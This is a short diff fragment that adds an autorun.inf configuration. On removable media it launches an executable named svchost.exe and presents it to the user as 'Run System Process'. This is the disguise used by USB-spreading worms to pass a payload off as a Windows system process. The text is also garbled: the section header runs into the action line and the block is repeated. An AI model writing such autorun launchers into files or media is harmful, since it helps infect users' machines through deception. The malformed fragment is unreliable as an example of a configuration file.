@@ -1,0 +1,4 @@
+[autorun]
+open=svchost.exe
+action=Run System Process[autorun]
+open=svchost.exe
